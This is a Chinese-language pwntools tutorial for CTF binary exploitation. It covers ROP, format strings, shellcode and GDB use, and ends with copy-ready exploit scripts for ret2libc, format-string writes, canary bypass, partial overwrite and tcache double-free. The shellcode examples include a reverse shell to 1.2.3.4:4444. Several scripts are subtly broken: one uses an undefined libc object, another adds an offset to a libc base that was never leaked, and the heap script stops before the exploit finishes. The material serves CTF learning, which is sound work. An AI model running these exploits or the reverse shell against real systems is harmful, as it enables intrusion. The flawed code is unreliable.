# pwntools 实战使用指南

> PWN 题的 Python 框架——从连接管理到 payload 构造、从 ELF 解析到 ROP 链组装，所有模板开箱即用。CTF PWN 方向、二进制漏洞利用的标配。

---

## 目录

- [一、pwntools 是什么](#一pwntools-是什么)
- [二、安装与环境配置](#二安装与环境配置)
- [三、核心工作流总览](#三核心工作流总览)
- [四、连接管理（process / remote）](#四连接管理process--remote)
- [五、context 全局配置](#五context-全局配置)
- [六、IO 交互（send / recv）](#六io-交互send--recv)
- [七、ELF 文件操作](#七elf-文件操作)
- [八、payload 打包（p32 / p64 / u64）](#八payload-打包p32--p64--u64)
- [九、ROP 链构造](#九rop-链构造)
- [十、格式化字符串（fmtstr_payload）](#十格式化字符串fmtstr_payload)
- [十一、shellcraft 与 asm](#十一shellcraft-与-asm)
- [十二、GDB 调试 attach](#十二gdb-调试-attach)
- [十三、完整实战模板](#十三完整实战模板)
- [十四、实战技巧与注意事项](#十四实战技巧与注意事项)
- [十五、速查表](#十五速查表)
- [十六、实战功能脚本库](#十六实战功能脚本库)
- [十七、实战流程决策树](#十七实战流程决策树)

---

## 一、pwntools 是什么

pwntools 是 Gallopsled 团队开发的 CTF 框架，专为二进制漏洞利用设计。它的核心能力：**用 Python 一行连接目标、几行构造 payload、自动处理大小端序和地址打包，把精力放在漏洞逻辑而非模板代码上**。

在 CTF 与安全工作中的典型场景：

- PWN 题：栈溢出、格式化字符串、堆利用、ROP
- 漏洞利用开发：写 PoC 验证 CVE
- 二进制自动化：批量 fuzz、自动化利用

### pwntools vs 原生 socket

| 维度 | pwntools | 原生 socket |
|------|----------|-------------|
| 连接 | `remote(ip, port)` | `socket.socket()` + `connect()` |
| 收发 | `recvuntil`/`sendline` | 手动 `recv` + 拼缓冲区 |
| 打包 | `p64(addr)` | `struct.pack('<Q', addr)` |
| ELF 解析 | `ELF('./binary').got['puts']` | 手动 readelf/解析 |
| ROP | `ROP(elf).call(system, ['/bin/sh'])` | 手工拼 gadget |
| 调试 | `gdb.attach(p)` | 手动开终端 |

> 💡 **结论**：写 PWN 必用 pwntools，省 90% 模板代码。

---

## 二、安装与环境配置

```bash
# Python 3.8+
pip3 install pwntools

# 验证
python3 -c "from pwn import *; print(pwnlib.__version__)"

# Kali Linux 通常已预装
```

### 配套环境

```bash
# GDB + pwndbg（动态调试必备）
git clone https://github.com/pwndbg/pwndbg.git
cd pwndbg && ./setup.sh

# ROPgadget（找 gadget）
pip3 install ROPgadget

# one_gadget（找 execve gadget）
gem install one_gadget

# checksec（查保护，pwntools 也内置）
pip3 install checksec.py
# 或用 pwntools: checksec('./pwn')
```

### 首次使用注意

```python
from pwn import *
# 这会导入大量符号到全局命名空间，正常行为
# 会有一些警告，可忽略

# 关闭烦人的日志
context.log_level = 'error'   # error / warning / info / debug
```

---

## 三、核心工作流总览

PWN 题标准流程：

1. **查保护**：`checksec('./pwn')` 看 NX/PIE/Canary/RELRO
2. **逆向**：IDA 看漏洞点（gets/scanf/printf 格式串）
3. **连接**：本地 `process('./pwn')` 或远程 `remote(ip, port)`
4. **找偏移**：`cyclic(500)` + GDB 看崩溃点
5. **构造 payload**：填充 + 返回地址 / ROP 链
6. **发送**：`sendline(payload)`
7. **拿 Shell**：`p.interactive()`

---

## 四、连接管理（process / remote）

### 1. 本地连接

```python
from pwn import *

# 启动本地二进制
p = process('./pwn')

# 带参数
p = process(['./pwn', 'arg1', 'arg2'])

# 带环境变量
p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})

# 指定解释器（不同 libc）
p = process('./pwn', env={'LD_LIBRARY_PATH': './'})
```

### 2. 远程连接

```python
# 连远程题目
p = remote('challenge.ctf.com', 9999)

# 走代理（如 SSH 隧道）
p = remote('127.0.0.1', 9999)

# SSL/TLS
p = remote('challenge.ctf.com', 443, ssl=True)
```

### 3. 命令行参数切换（推荐模板）

```python
from pwn import *
import sys

# 本地：python3 exp.py
# 远程：python3 exp.py REMOTE 1.2.3.4 9999
# GDB：python3 exp.py GDB

def start():
    if args.GDB:
        return gdb.debug('./pwn', gdbscript='''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

io = start()
```

### 4. 关闭连接

```python
p.close()           # 显式关闭
# 或用上下文管理器
with process('./pwn') as p:
    p.sendline(b'hello')
    print(p.recvline())
```

---

## 五、context 全局配置

`context` 是 pwntools 的全局配置，影响所有操作。

```python
from pwn import *

# 架构（影响 p64/asm/shellcode）
context.arch = 'amd64'     # amd64 / i386 / arm / aarch64 / mips
# 或自动从二进制读取
context.binary = ELF('./pwn')   # 自动设置 arch/os

# 操作系统
context.os = 'linux'

# 日志级别
context.log_level = 'debug'     # debug / info / warning / error
context.log_level = 'info'      # 默认，建议比赛用 info

# 终端（gdb.attach 时用）
context.terminal = ['tmux', 'splitw', '-h']   # tmux 水平分屏
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']  # GNOME

# 字节序（一般不用改）
context.endian = 'little'
context.bits = 64              # 配合 arch，一般不用单独设
```

### 一行配置

```python
context(arch='amd64', os='linux', log_level='info')
```

---

## 六、IO 交互（send / recv）

### 1. 发送

```python
p.send(b'data')           # 发送原始数据（不加换行）
p.sendline(b'data')       # 发送数据 + \n
p.sendlineafter(b'> ', b'data')   # 等到收到 '> ' 再发送
p.sendafter(b'> ', b'data')       # 等到收到 '> ' 再发送（不加换行）

# 发送并打印
p.sendline(b'payload')    # 默认会打印发送内容（log_level >= info）
```

### 2. 接收

```python
p.recv(1024)              # 接收最多 1024 字节
p.recvall()               # 接收直到连接关闭（阻塞）
p.recvline()              # 接收一行（含 \n）
p.recvlines(5)            # 接收 5 行
p.recvuntil(b'flag{')     # 接收直到遇到 'flag{'（返回含该串）
p.recvuntil(b'}')         # 配合上面接收完整 flag
p.recvn(100)              # 精确接收 100 字节
```

### 3. 接收 + 超时

```python
p.recv(timeout=2)         # 最多等 2 秒
p.recvuntil(b'> ', timeout=5)   # 5 秒内等到 '> '，否则抛异常
```

### 4. 交互模式

```python
p.interactive()           # 进入交互模式，手动输入输出
# 相当于直接连到目标的 shell
# Ctrl+C 退出
```

### 5. 实用辅助函数（建议自己封装）

```python
def sla(delim, data):
    """sendlineafter 简写"""
    return p.sendlineafter(delim, data)

def sa(delim, data):
    """sendafter 简写"""
    return p.sendafter(delim, data)

def ru(delim):
    """recvuntil 简写"""
    return p.recvuntil(delim)
```

### 6. 处理回显

```python
# 发送后立即收到的回显（题目 echo 输入）
p.sendline(b'payload')
p.recvline()              # 丢掉回显
data = p.recvline()       # 真正的响应
```

---

## 七、ELF 文件操作

`ELF` 类能解析二进制，直接拿地址，省去手动 readelf。

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# 符号地址
elf.symbols['main']            # main 函数地址
elf.symbols['win']             # 后门函数地址
elf.entry                       # 入口点

# PLT / GOT
elf.plt['puts']                # puts 的 PLT 地址
elf.got['puts']                # puts 的 GOT 地址
elf.plt['system']
elf.got['system']

# 搜索字符串/字节
next(elf.search(b'/bin/sh'))   # 找 /bin/sh 字符串地址
next(elf.search(b'flag'))      # 找 flag 字符串
next(elf.search(asm('pop rdi; ret')))  # 找特定字节序列

# 搜索函数
# 找 libc 里的 system
libc.symbols['system']
next(libc.search(b'/bin/sh\x00'))

# 地址计算（libc 偏移）
libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
```

### PIE 处理

```python
elf = ELF('./pwn')
# 如果 PIE 开启，symbols 返回的是相对偏移
# 需要泄露一个地址才能算出基址
# 例：泄露了 main 真实地址
main_real = 0x5555555551a0
elf.address = main_real - elf.symbols['main']
# 之后 elf.symbols['win'] 自动返回真实地址
win_addr = elf.symbols['win']
```

---

## 八、payload 打包（p32 / p64 / u64）

地址和数值的打包解包，pwntools 自动处理大小端序。

### 1. 打包（数字 → 字节）

```python
from pwn import *

p32(0x41414141)        # b'AAAA'        （32 位小端）
p64(0x41414141)        # b'AAAA\x00\x00\x00\x00'（64 位小端）

p16(0x1234)            # b'\x34\x12'    （16 位）
p8(0x41)               # b'A'           （8 位）

# 大端序（网络字节序，按需）
p32(0x41414141, endian='big')   # b'AAAA'
```

### 2. 解包（字节 → 数字）

```python
u32(b'AAAA')           # 0x41414141
u64(b'AAAA\x00\x00\x00\x00')    # 0x41414141
u16(b'\x34\x12')       # 0x1234
u8(b'A')               # 0x41

# 处理 libc 泄露（6 字节地址，补 0 到 8 字节）
leaked = p.recv(6)
addr = u64(leaked.ljust(8, b'\x00'))   # 右补 0
```

### 3. 其他打包

```python
# 拼接多个
flat(0x41414141, 0x42424242, 0x43434343)
# b'AAAABBBBCCCC'

# 按架构自动选 p32/p64
flat([1, 2, 3])        # context.arch 决定
```

### 4. 字符串转字节

```python
b'hello'               # 直接字面量
'hello'.encode()       # str → bytes
```

---

## 九、ROP 链构造

### 1. 手工构造（基础）

```python
from pwn import *

# 找 gadget
# ROPgadget --binary pwn | grep "pop rdi"
pop_rdi = 0x401233     # ROPgadget 找到的地址
ret = 0x40101a         # 一个 ret，用于栈对齐

# ret2win：跳到后门函数
win = elf.symbols['win']
payload = b'A' * offset + p64(win)

# ret2system：system("/bin/sh")
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']
payload = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret)        # 栈对齐（Ubuntu 18.04+ 需要）
payload += p64(system)
```

### 2. 用 ROP 类（推荐）

```python
from pwn import *

elf = ELF('./pwn')
rop = ROP(elf)

# 自动找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 方法1：手工 + ROP 找 gadget
rop.raw(pop_rdi)
rop.raw(next(elf.search(b'/bin/sh')))
rop.raw(ret)           # 对齐
rop.raw(elf.plt['system'])
payload = b'A' * offset + rop.chain()

# 方法2：高级 API（自动找 gadget）
rop.call(system, [next(elf.search(b'/bin/sh'))])
# 或
rop.call('system', ['/bin/sh'])
payload = b'A' * offset + rop.chain()

# 多个调用
rop.call('puts', [elf.got['puts']])
rop.call('main')       # 返回 main 再打一次
payload = b'A' * offset + rop.chain()
```

### 3. ret2libc 完整流程

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(elf).find_gadget(['ret'])[0]

# 第一步：泄露 puts@got
payload = b'A' * 72
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])   # 回 main

p.sendlineafter(b'input: ', payload)
p.recvline()                          # 丢掉回显
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

# 第二步：算 libc 基址
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
log.info(f"libc base @ {hex(libc_base)}")

# 第三步：再溢出调 system("/bin/sh")
payload2 = b'A' * 72
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(ret)                  # 对齐
payload2 += p64(system)

p.sendlineafter(b'input: ', payload2)
p.interactive()
```

### 4. one_gadget 利用

```python
# 终端: one_gadget libc.so.6
# 输出几个可直接 getshell 的 gadget 地址（相对 libc）
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rcx == NULL

one_gadget_offset = 0x4f2c5
one_gadget = libc_base + one_gadget_offset
payload = b'A' * offset + p64(one_gadget)
# 注意约束条件，可能需要先 pop 调整寄存器
```

---

## 十、格式化字符串（fmtstr_payload）

### 1. 找偏移

```python
# 手动：发送 AAAA%p%p%p%p... 看哪个 0x41414141
# 或用 pwntools
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
print(p.recvline())
# 输出 AAAA0xffe.0x1.0x41414141.... → 偏移是 6
```

### 2. 用 fmtstr_payload 自动构造

```python
from pwn import *

# 任意地址写任意值
# offset: 格式化字符串在栈上的偏移（上一步测的）
# target_addr: 要写入的地址
# target_value: 要写入的值
offset = 6
target_addr = 0x601040
target_value = 0x12345678
payload = fmtstr_payload(offset, {target_addr: target_value})
p.sendline(payload)

# 多个地址同时写
payload = fmtstr_payload(offset, {
    0x601040: 0x12345678,
    0x601044: 0xdeadbeef,
})
```

### 3. fmtstr_payload 参数

```python
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
# offset: 栈偏移
# writes: {addr: value} 字典
# numbwritten: 已打印的字符数（前面有输出时需要）
# write_size: 'byte' / 'short' / 'int'
#   byte: 一次写 1 字节，payload 长但稳定
#   short: 一次写 2 字节
#   int: 一次写 4 字节，payload 短但可能失败

# 例：用 short 减少长度
payload = fmtstr_payload(6, {0x601040: 0x12345678}, write_size='short')
```

### 4. 读取内存

```python
# 读指定地址的内容（泄露）
# 利用 %s 读字符串，或 %p 读值
addr = 0x601040
# 假设偏移是 6，把 addr 放在栈上，用 %6$s 读
payload = p64(addr) + b'%6$s'
p.sendline(payload)
data = p.recvuntil(b'\x00')
```

### 5. 64 位格式化字符串注意事项

64 位下地址含 `\x00`，放前面会被截断。解决方法：

```python
# 把地址放 payload 末尾
# payload = b'AAAAAAAA%6$s' + p64(addr)
# 调整偏移计算
```

---

## 十一、shellcraft 与 asm

### 1. 生成 shellcode

```python
from pwn import *

context.arch = 'amd64'

# 标准 execve("/bin/sh")
sc = asm(shellcraft.sh())
print(f"长度: {len(sc)}")
print(f"hex: {sc.hex()}")

# 自定义命令
sc = asm(shellcraft.cat('/flag'))
sc = asm(shellcraft.execve('/bin/sh', ['sh', '-p'], 0))

# 反弹 shell
sc = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())

# 读文件
sc = asm(shellcraft.open('/flag') + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 100))
```

### 2. 不同架构

```python
context.arch = 'i386'
sc = asm(shellcraft.sh())       # 32 位 shellcode

context.arch = 'arm'
sc = asm(shellcraft.sh())       # ARM shellcode

context.arch = 'aarch64'
sc = asm(shellcraft.sh())       # ARM64 shellcode
```

### 3. asm / disasm

```python
# 汇编
asm('mov rax, 0x3b; syscall')
# b'\xb8\x3b\x00\x00\x00\x0f\x05'

# 反汇编
disasm(b'\xb8\x3b\x00\x00\x00\x0f\x05')
# 0:   b8 3b 00 00 00       mov    eax, 0x3b
# 5:   0f 05                syscall
```

### 4. shellcode 优化

```python
# 避免坏字符（如 \x00 \x0a）
sc = asm(shellcraft.sh())
# 检查是否含坏字符
bad = b'\x00\x0a\x0d'
if any(b in sc for b in bad):
    print("含坏字符，需要用其他方式编码")

# 用 shellcraft.amd64.linux.sh() 的短版
# 或从 shell-storm.org 找更短的
```

---

## 十二、GDB 调试 attach

### 1. 启动时附加

```python
from pwn import *

p = process('./pwn')
# 立即附加 GDB（新开终端）
gdb.attach(p, '''
    b *0x401234
    b main
    continue
''')

input('按回车继续...')   # 等 GDB 准备好
p.sendline(b'payload')
p.interactive()
```

### 2. gdb.debug（推荐）

```python
# 直接在 GDB 下启动二进制
p = gdb.debug('./pwn', gdbscript='''
    b *0x401234
    b vuln
    continue
''')
# 自动打开 GDB 终端，断在断点处
```

### 3. 命令行参数切 GDB

```python
from pwn import *
import sys

def start():
    if args.GDB:
        return gdb.debug('./pwn', '''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

p = start()
```

### 4. 找偏移（cyclic）

```python
from pwn import *

p = process('./pwn')
p.sendline(cyclic(500))
p.wait()             # 等待崩溃

# 读 core dump
core = p.corefile
print(f"crash at: {hex(core.pc)}")          # 崩溃地址
# 或读 rsp 指向的内容
offset = cyclic_find(core.read(core.rsp, 4))
print(f"offset: {offset}")
```

### 5. 实时调试技巧

```python
# 运行中暂停
p.sendline(b'payload')
# 此时去 GDB 终端按 Ctrl+C，可看内存/寄存器

# 在 GDB 中：
# x/20gx $rsp-100    看栈
# x/s 0x601040        看字符串
# info registers      看寄存器
# vmmap               看内存映射
```

---

## 十三、完整实战模板

### 1. 通用模板（推荐收藏）

```python
#!/usr/bin/env python3
"""
pwntools 通用 PWN 模板
用法:
    python3 exp.py            本地
    python3 exp.py GDB        本地 + GDB
    python3 exp.py REMOTE 1.2.3.4 9999   远程
"""
from pwn import *

# ===== 配置 =====
context(arch='amd64', os='linux', log_level='info')
# context(arch='i386', os='linux', log_level='info')   # 32 位

BINARY = './pwn'
elf = ELF(BINARY)
# libc = ELF('./libc.so.6')

# ===== 模式切换 =====
def start():
    if args.GDB:
        return gdb.debug(BINARY, '''
            b *0x401234
            continue
        ''')
    elif args.REMOTE:
        return remote(args.HOST, args.PORT)
    else:
        return process(BINARY)

io = start()

# ===== 辅助函数 =====
def sla(delim, data): io.sendlineafter(delim, data)
def sa(delim, data): io.sendafter(delim, data)
def ru(delim): return io.recvuntil(delim)

# ===== 求偏移 =====
# io.sendline(cyclic(500))
# io.wait()
# core = io.corefile
# offset = cyclic_find(core.read(core.rsp, 4))
# log.info(f"offset = {offset}")

# ===== 漏洞利用 =====
offset = 0          # 改成实际偏移

# ret2win
# win = elf.symbols['win']
# payload = b'A' * offset + p64(win)

# ret2libc
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# ret = rop.find_gadget(['ret'])[0]
# ... 见第九章

# ===== 发送 payload =====
# sla(b'input: ', payload)

io.interactive()
```

### 2. ret2win 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
p = process('./pwn')

offset = 72
win = elf.symbols['win']

payload = b'A' * offset + p64(win)
p.sendlineafter(b'input: ', payload)
p.interactive()
```

### 3. ret2libc 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
offset = 72

# 泄露 puts@got
payload = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
p.sendlineafter(b'input: ', payload)
p.recvline()
leaked = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(system)
p.sendlineafter(b'input: ', payload2)
p.interactive()
```

### 4. 格式化字符串模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./pwn')
p = process('./pwn')

# 测偏移
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
leak = p.recvline()
log.info(f"leak: {leak}")
# 找 0x41414141 的位置 → offset

offset = 6
target = elf.got['printf']    # 改 printf@got 为 system
value = elf.plt['system']     # 写入 system 地址（需要先泄露 libc）

payload = fmtstr_payload(offset, {target: value}, write_size='short')
p.sendline(payload)

# 之后输入 /bin/sh 触发 system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

---

## 十四、实战技巧与注意事项

### 1. 标准流程清单

1. `checksec ./pwn` 看保护
2. IDA 找漏洞函数和后门
3. `cyclic(500)` 测偏移
4. 写 exp，先本地 process 测
5. 测通后改 remote 打远程
6. 卡住用 `args.GDB` 动态调试

### 2. 保护机制对应策略

| 保护 | 含义 | 绕过策略 |
|------|------|----------|
| NX | 栈不可执行 | ret2libc / ROP，不能 shellcode |
| PIE | 地址随机化 | 先泄露一个地址算基址 |
| Canary | 栈金丝雀 | 泄露 canary / 格式化字符串读 |
| Full RELRO | GOT 只读 | 不能改 GOT，用 __malloc_hook 等 |

### 3. 栈对齐（Ubuntu 18.04+）

64 位 Ubuntu 的 system 要求 16 字节栈对齐，差一个 ret：

```python
# 加一个 ret gadget 对齐
payload = b'A' * offset
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(ret)        # 关键：对齐
payload += p64(system)
```

### 4. 处理不同 libc

```python
# 题目给的 libc 必须用
libc = ELF('./libc-2.31.so')

# 远程 libc 和本地不同 → 用 patchelf 替换本地 libc 测试
patchelf --set-interpreter ./ld-2.31.so --replace-needed libc.so.6 ./libc-2.31.so ./pwn

# 或运行时指定
p = process('./pwn', env={'LD_PRELOAD': './libc-2.31.so'})
```

### 5. 处理输入输出格式

```python
# 题目用 read(0, buf, 0x100) → 不需要换行
p.send(payload)          # 不加 \n

# 题目用 scanf/gets → 需要换行
p.sendline(payload)      # 加 \n

# 题目输出有特定格式
p.recvuntil(b'Your name: ')
p.sendline(b'admin')
p.recvuntil(b'Hello, ')
name = p.recvline()      # 收到的名字
```

### 6. 常见踩坑

- **`u64` 报错**：泄露的字节数不够，用 `leaked.ljust(8, b'\x00')` 补 0
- **system 拿不到 Shell**：栈没对齐，加 `ret` gadget
- **本地通了远程不通**：libc 版本不同，必须用题目给的 libc
- **格式化字符串 64 位失败**：地址含 `\x00` 截断，把地址放末尾
- **gdb.attach 没反应**：没配 `context.terminal`，或没用 tmux
- **PIE 题目偏移不对**：先泄露一个真实地址算 `elf.address`

---

## 十五、速查表

### 导入与配置

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
context.binary = ELF('./pwn')   # 自动设架构
context.terminal = ['tmux', 'splitw', '-h']  # GDB 终端
```

### 连接

```python
p = process('./pwn')                     # 本地
p = process('./pwn', env={'LD_PRELOAD': './libc.so'})  # 指定 libc
p = remote('1.2.3.4', 9999)              # 远程
p = gdb.debug('./pwn', 'b main\ncontinue')  # GDB 调试
gdb.attach(p, 'b *0x401234')             # 附加 GDB
p.interactive()                          # 交互模式
p.close()                                # 关闭
```

### IO

```python
p.send(data)                  # 发送（不换行）
p.sendline(data)              # 发送 + \n
p.sendlineafter(delim, data)  # 等到 delim 再 sendline
p.recv(n)                     # 收 n 字节
p.recvline()                  # 收一行
p.recvuntil(delim)            # 收到 delim
p.recvall()                   # 收到关闭
p.recvn(n)                    # 精确收 n 字节
p.recv(timeout=2)             # 带超时
```

### 打包解包

```python
p32(0x41414141)               # → b'AAAA'
p64(0x41414141)               # → b'AAAA\x00\x00\x00\x00'
u32(b'AAAA')                  # → 0x41414141
u64(b'AAAA\x00\x00\x00\x00') # → 0x41414141
u64(leaked.ljust(8, b'\x00'))# 泄露地址补 0
flat([1, 2, 3])               # 拼接
```

### ELF

```python
elf = ELF('./pwn')
libc = ELF('./libc.so')
elf.symbols['main']           # 函数地址
elf.plt['puts']               # PLT
elf.got['puts']               # GOT
next(elf.search(b'/bin/sh'))  # 搜字符串
elf.entry                     # 入口
# PIE 泄露后：
elf.address = leaked - elf.symbols['main']
```

### ROP

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
rop.call('system', ['/bin/sh'])
rop.raw(p64(pop_rdi) + p64(bin_sh))
payload = b'A' * offset + rop.chain()
```

### 格式化字符串

```python
# 测偏移
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.')
# 自动写
payload = fmtstr_payload(offset, {addr: value})
payload = fmtstr_payload(6, {0x601040: 0x12345678}, write_size='short')
```

### shellcode

```python
sc = asm(shellcraft.sh())              # 标准 shellcode
sc = asm(shellcraft.cat('/flag'))      # 读 flag
sc = asm(shellcraft.connect('1.2.3.4', 4444) + shellcraft.dupsh())  # 反弹
disasm(b'\xb8\x3b\x00\x00\x00')       # 反汇编
```

### 找偏移

```python
p.sendline(cyclic(500))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
# 或直接 cyclic_find(core.pc)
```

### 日志

```python
log.info(f"puts @ {hex(leaked)}")      # 信息
log.success("got shell!")              # 成功（绿色）
log.warning("offset may be wrong")     # 警告
log.failure("connection lost")         # 失败（红色）
```

---

## 十六、实战功能脚本库

> 以下脚本可直接复制使用，覆盖 PWN 题高频实战场景。每个脚本独立运行，配合 [十三章通用模板](#十三完整实战模板) 的连接/上下文配置即可。

### 1. ROP 自动化 leak libc + getshell

`ret2libc` 完整脚本，自动 leak 任意 GOT、算 libc 基址、调 system。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')

def start():
    if args.REMOTE: return remote(args.HOST, args.PORT)
    if args.GDB:    return gdb.debug('./pwn', 'b *main\ncontinue')
    return process('./pwn')

io = start()
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]
offset  = 72                      # cyclic 测出的偏移

# ---- stage 1: leak puts@got ----
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
io.sendlineafter(b'input: ', payload)
io.recvline()
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.success(f"puts @ {hex(leak)}")

# ---- stage 2: 算基址 + getshell ----
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
log.info(f"libc base @ {hex(libc.address)}")

payload2  = b'A' * offset
payload2 += p64(ret)                       # 16 字节对齐
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system)
io.sendlineafter(b'input: ', payload2)
io.interactive()
```

### 2. 格式化字符串任意写 + 任意读

`fmtstr_payload` 自动构造写，手工 `%n` 读取栈/任意地址。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf = ELF('./pwn')
io = process('./pwn')

# ---- 1. 测偏移 ----
io.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.')
line = io.recvline()
# 找到 0x4141414141414141 出现的位置 → offset
offset = 6
log.info(f"fmtstr offset = {offset}")

# ---- 2. 任意写：把 printf@got 改成 system@plt（或 libc system）----
target = elf.got['printf']
value  = libc.symbols['system']            # 需先 leak libc
payload = fmtstr_payload(offset, {target: value}, write_size='short')
io.sendline(payload)

# ---- 3. 任意读：用 %s 读 target 处字符串 ----
# 注意 64 位下地址含 \x00 会截断，把地址放在 payload 末尾
addr = elf.got['puts']
payload_read = b'LEAK:%' + str(offset).encode() + b'$s' + b'AAAA' + p64(addr)
io.sendline(payload_read)
io.recvuntil(b'LEAK:')
got_val = u64(io.recv(6).ljust(8, b'\x00'))
log.success(f"puts@got = {hex(got_val)}")

# ---- 4. 触发 system("/bin/sh") ----
io.sendline(b'/bin/sh')
io.interactive()
```

### 3. Canary 泄露 + 栈溢出

利用 printf 泄露栈上的 canary，再正常栈溢出。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./pwn')
libc = ELF('./libc.so.6')
io = process('./pwn')

# ---- 1. 泄露 canary：canary 通常在 rbp-8，对 64 位在格式串第 7+8 处 ----
# 题目若 printf(buf)，发 %p 链找末尾是 \x00 的 8 字节即 canary
io.sendline(b'%p.' * 20)
leak = io.recvline()
log.info(f"leak: {leak}")
# 假设第 11 个 %p 是 canary
canary = int(leak.split(b'.')[10], 16)
log.success(f"canary = {hex(canary)}")

# ---- 2. 带上 canary 的栈溢出 ----
offset = 0x38                       # buf 到 canary 的距离
pop_rdi = 0x401233
ret     = 0x40101a

# 提前 leak libc（略），这里直接用 one_gadget
one_gadget = libc.address + 0x4f2c5

payload  = b'A' * offset
payload += p64(canary)
payload += p64(0)                    # saved rbp
payload += p64(ret)                  # 对齐
payload += p64(one_gadget)
io.sendline(payload)
io.interactive()
```

### 4. partial overwrite / 爆破返回地址

无 leak、PIE 未全开时爆破 1~2 字节返回地址。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='warning')

elf = ELF('./pwn')

def try_once(byte_low):
    io = process('./pwn')
    io.sendlineafter(b'input: ', b'A' * 72 + bytes([byte_low]))
    try:
        io.recv(timeout=0.5)
        io.sendline(b'cat /flag')
        flag = io.recvline(timeout=1)
        if b'flag' in flag or b'ctf' in flag:
            log.success(f"hit byte = {hex(byte_low)}: {flag}")
            return True
    except Exception:
        pass
    io.close()
    return False

# PIE 题 main 末位固定 0，后门函数低字节在末位+offset
# 爆破 1 字节（最多 256 次）
for b in range(1, 0x100):
    if try_once(b):
        break
```

### 5. 堆题：tcache 快速消费 / double free 检测

glibc 2.27+ tcache 利用辅助：把 7 个 chunk 都填进 tcache 触发 fastbin/unsorted。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux', log_level='info')

io = process('./pwn')
libc = ELF('./libc.so.6')

def alloc(size, data=b'AAAA'):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendlineafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())

# ---- tcache poisoning：double free 一个 chunk 改 fd 指向 __free_hook ----
for _ in range(7):                  # 先消耗 tcache 对应大小
    alloc(0x40)
target = libc.symbols['__free_hook']

alloc(0x40, b'victim')              # idx 7
free(7)                             # 进 tcache
free(7)                             # double free (glibc 2.27 tcache 无 key 校验)
alloc(0x40, p64(target))            # idx 8，写入 fd
alloc(0x40)                         # idx 9
